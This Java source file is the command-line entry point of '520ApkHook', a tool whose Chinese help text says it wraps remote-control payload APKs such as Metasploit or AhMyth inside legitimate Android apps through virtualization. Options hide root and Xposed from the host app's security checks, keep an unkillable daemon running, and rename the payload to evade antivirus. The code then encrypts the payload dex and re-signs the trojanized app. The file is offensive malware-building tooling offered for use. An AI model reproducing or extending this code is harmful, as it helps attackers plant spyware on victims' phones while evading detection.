package org.a520apkhook;

import java.io.File;
import java.io.IOException;
import java.util.Objects;

import picocli.CommandLine;
import picocli.CommandLine.Command;
import picocli.CommandLine.Option;
import picocli.CommandLine.Parameters;

import org.apache.commons.io.FileUtils;

@Command(name = "520ApkHook", mixinStandardHelpOptions = true, version = "520ApkHook V1.2.1",
        description = "使用虚拟化技术将远控apk注入到一些apk中. \n源项目通过反编译修改源APK文件以达到注入Payload目的, 会被各种加固检测到, 新版本不需要对源APK进行任何修改, 直接使用虚拟技术运行APK, 绕过APK安全检测. \n项目地址: https://github.com/ba0gu0/520apkhook")
public class App implements Runnable
{
    private static final String TAG = "Main";

    @Option(names = {"-c", "--clean"}, description = "清除临时工作目录, 默认为: True。")
    private boolean clean = false;

    @Option(names = {"-r", "--hideRoot"}, description = "隐藏root权限, 让app无法检测到root(用来防止被注入的app安全检测), 默认为: True. ")
    private boolean hideRoot = true;

    @Option(names = {"-x", "--hideXposed"}, description = "隐藏Xposed, 让app无法检测到Xposed(用来防止被注入的app安全检测), 默认为: True. ")
    private boolean hideXposed = true;

    @Option(names = {"-o", "--enableOldSdk"}, description = "使用老版本的SDK声明, app在第一次启动时, 会提示系统给予对应的权限. 默认为: False ")
    private boolean oldSdk = false;

    @Option(names = {"-d", "--enableDaemonService"}, description = "开启后台守候进程, 通过在通知栏驻留通知, 保证app不被杀死(上滑也杀不掉, 必须进设置停止, 会在地址栏留下通知), 默认为: False. ")
    private boolean enableDaemonService = false;

    @Option(names = {"-p", "--newPackageName"}, description = "新生成的包名称, 例如 com.tencent.mm.hack. \n目前版本存在问题, 新包名不能和被注入app的包名相同, 会导致无法启动. 默认为: 原包名 + .a520apkbox . ")
    private String newPackageName;

    @Option(names = {"-s", "--payloadService"}, description = "远控apk中, 用来启动Service服务名称. 比如AhMyth, 启动的后台服务为 `ahmyth.mine.king.ahmyth.MainService`. ")
    private String payloadService;

    @Option(names = {"-b", "--boxName"}, description = "选择一个容器用来运行app，默认为`SpaceCore`，如果生成的app运行错误或者卡顿，可以尝试使用`NewBlackBox`。")
    private String boxName = "SpaceCore";

    @Parameters(index = "0", description = "需要注入的apk文件. ", arity = "1")
    private String hackApkFilePath;

    @Parameters(index = "1", description = "注入的apk文件, 比如msf生成的apk, 或者任何使用纯java/编写的apk(apk中不要存在libs目录)", arity = "1")
    private String payloadApkFilePath;

    public static void main(String[] args) {

        LogUtils.setLogOutLevel(LogUtils.Level.INFO);

        int exitCode = new CommandLine(new App()).execute(args);

        System.exit(exitCode);

    }

    @Override
    public void run() {

        LogUtils.info(TAG, "启动程序.\n" + Config.LOGO);

        try {
            Config.hackApkFilePath = new File(hackApkFilePath).getCanonicalPath();
            Config.payloadApkFilePath = new File(payloadApkFilePath).getCanonicalPath();
        } catch (IOException e) {
            LogUtils.warn(TAG, "获取文件规范路径失败: " + e.getMessage());
            Config.hackApkFilePath = new File(hackApkFilePath).getAbsolutePath();
            Config.payloadApkFilePath = new File(payloadApkFilePath).getAbsolutePath();
        }

        // 设置其他参数
        Config.hideRoot = hideRoot;
        Config.hideXposed = hideXposed;
        Config.enableDaemonService = enableDaemonService;

        if (Objects.equals(boxName, "NewBlackBox")){
            Config.apkBox64FilePath = Config.workDir + "/libs/520ApkBoxNewBlackBox64.apk";
            Config.apkBox32FilePath = Config.workDir + "/libs/520ApkBoxNewBlackBox32.apk";
        }else {
            Config.apkBox64FilePath = Config.workDir + "/libs/520ApkBoxSpaceCore64.apk";
            Config.apkBox32FilePath = Config.workDir + "/libs/520ApkBoxSpaceCore32.apk";
        }

        initWorkDir();

        LogUtils.info(TAG, "被注入的 Apk 文件为: " + Config.hackApkFilePath);

        LogUtils.info(TAG, "进行注入的 Payload Apk 文件为: " + Config.payloadApkFilePath);

        getSourceApkInfo();

        byPassPayloadApk();

//        System.exit(1);

        getPayloadApkInfo();

        if (newPackageName != null) {
            Config.newPackageName = newPackageName;
        }

        if (payloadService != null){
            Config.payloadApkMainServiceName = payloadService;
        }

        if (oldSdk){
            Config.apkBoxUseOldSdk = true;
        }

        startHackApk();

        if (clean) {
            cleanWorkDir();
        }

        LogUtils.info(TAG, "所有工作已完成, 最终成果为: " + Config.signerApkFilePath + " . app的证书签名文件为: " + Config.apkKeyStoreFilePath +
                " .  密码为: " + Config.apkSignerPass);
    }

    private static void initWorkDir(){

        LogUtils.info(TAG, "初始化工作环境.");
        try {
            Config.initWorkDir();
            LogUtils.info(TAG, "释放所有脚本成功.");
        }catch (IOException e){
            LogUtils.error(TAG, "释放脚本失败! 无法进行下一步, 程序退出! " + e.getMessage());
            System.exit(1);
        }
    }

    private static void cleanWorkDir(){

        try {
            Thread.sleep(1000);
            FileUtils.deleteDirectory(new File(Config.workDir));
            LogUtils.info(TAG, "删除工作目录." + Config.workDir);
        }catch (IOException | InterruptedException e){
            LogUtils.error(TAG, "删除工作目录失败." + Config.workDir + e.getMessage());
        }
    }

    private static void startHackApk(){
        LogUtils.info(TAG, "开始进行对被注入Apk进行包装.");
        HackApk hackApk = new HackApk();

        if (!hackApk.generateKeyStore()){
            LogUtils.warn(TAG, "无法生成新的证书文件，使用自带的证书文件，不影响, 继续下一步! ");
        }

        if (hackApk.decodeApkFile()){
            LogUtils.info(TAG, "反编译模板Apk成功.");
        }else {
            LogUtils.error(TAG, "反编译模板Apk失败, 无法进行下一步, 程序退出! ");
            System.exit(1);
        }

        if (!hackApk.changeAndroidManifest()){
            LogUtils.error(TAG, "修改AndroidManifest.xml文件失败, 无法进行下一步, 程序退出! ");
            System.exit(1);
        }

        if (!hackApk.setApkBoxAppName()){
            LogUtils.error(TAG, "修改string.xml文件失败, 无法进行下一步, 程序退出! ");
            System.exit(1);
        }

        if (!hackApk.fixValuesV31Colors()){
            LogUtils.error(TAG, "修复colors.xml文件失败, 无法进行下一步, 程序退出! ");
            System.exit(1);
        }

        try {
            hackApk.changeApktoolYaml();
        }catch (IOException e){
            LogUtils.warn(TAG, "修改apktool.yml文件失败, 但不影响, 继续下一步! " + e.getMessage());
        }

        try {
            hackApk.changeApkBoxPackageName();
        }catch (IOException e){
            LogUtils.error(TAG, "修改PackageName失败, 无法进行下一步, 程序退出! " + e.getMessage());
            System.exit(1);
        }

        try {
            hackApk.copyAssesResFile();
        }catch (IOException e){
            LogUtils.error(TAG, "复制资源文件到包装器失败, 无法进行下一步, 程序退出! " + e.getMessage());
            System.exit(1);
        }

        if (hackApk.buildApkFile()){
            LogUtils.info(TAG, "新App重新编译成功.");
        }else {
            LogUtils.error(TAG, "新App重新编译失败, 无法进行下一步, 程序退出! ");
            System.exit(1);
        }

        if (hackApk.zipalignApkFile()){
            LogUtils.info(TAG, "新App zip V4 对齐成功.");
        }else {
            LogUtils.error(TAG, "新App zip V4 对齐失败, 无法进行下一步, 程序退出! ");
            System.exit(1);
        }

        if (hackApk.signerApk()){
            LogUtils.info(TAG, "新App签名成功.");
        }else {
            LogUtils.error(TAG, "新App签名失败, 无法进行下一步, 程序退出! ");
            System.exit(1);
        }

    }
    private static void getSourceApkInfo(){
        GetSourceApkInfo GetSourceApkInfo = null;

        LogUtils.info(TAG, "尝试读取被注入Apk的信息. " + Config.hackApkFilePath);

        GetSourceApkInfo = new GetSourceApkInfo();

        if (! GetSourceApkInfo.getApkMetaInfo()){
            LogUtils.error(TAG, "读取被注入Apk文件Meta信息失败, 无法进行下一步, 程序退出! " + Config.hackApkFilePath);
            System.exit(1);
        }

        if (!GetSourceApkInfo.getApkIcon()){
            LogUtils.warn(TAG, "读取被注入Apk图标并保存时失败! 并不影响后续操作.");
        }

        if (!GetSourceApkInfo.getApkSigner()){
            Config.apkSignerPass = "p@ssw0rd";
            LogUtils.warn(TAG, "读取被注入Apk证书信息失败! 并不影响后续操作.");
        }

        if (!GetSourceApkInfo.getApkArchName()){
            LogUtils.error(TAG, "读取被注入Apk Arch信息失败, 无法进行下一步, 程序退出! ");
            System.exit(1);
        }

        LogUtils.info(TAG, "读取被注入Apk信息已完成. ");
    }

    private static void getPayloadApkInfo(){
        GetPayloadApkInfo GetPayloadApkInfo = new GetPayloadApkInfo();

        LogUtils.info(TAG, "尝试读取 Payload Apk的信息. " + Config.byPassPayloadApkFilePath);

        if (! GetPayloadApkInfo.decodeApkFile()){
            LogUtils.error(TAG, "反编译 Payload Apk 失败. 无法进行下一步, 程序退出! " + Config.payloadApkFilePath);
            System.exit(1);
        }

        if (! GetPayloadApkInfo.getPayloadApkInfo()){
            LogUtils.error(TAG, "尝试读取 Payload Apk的信息失败. 无法进行下一步, 程序退出! " + Config.payloadApkDecodeDir);
            System.exit(1);
        }

        if (! GetPayloadApkInfo.zipAndEncryptFiles()){
            LogUtils.error(TAG, "尝试加密压缩 Payload Apk的dex文件失败. 无法进行下一步, 程序退出! " + Config.payloadApkDecodeDir);
            System.exit(1);
        }

    }

    private static void byPassPayloadApk(){
        ByPassPayloadApk ByPassPayloadApk = new ByPassPayloadApk();

        LogUtils.info(TAG, "尝试修改 Payload Apk的包名以绕过杀软. " + Config.payloadApkFilePath);

        if (! ByPassPayloadApk.decodeApkFile()){
            LogUtils.error(TAG, "反编译 Payload Apk 失败. 无法进行下一步, 程序退出! " + Config.payloadApkFilePath);
            System.exit(1);
        }

        try {
            ByPassPayloadApk.changePayloadApkPackageName();
        } catch (IOException e) {
            LogUtils.error(TAG, "修改 Payload Apk 包名失败. 无法进行下一步, 程序退出! ");
            System.exit(1);
        }

        if (! ByPassPayloadApk.buildApkFile()){
            LogUtils.error(TAG, "重新编译 Payload Apk 失败. 无法进行下一步, 程序退出! " + Config.payloadApkFilePath);
            System.exit(1);
        }

    }

}
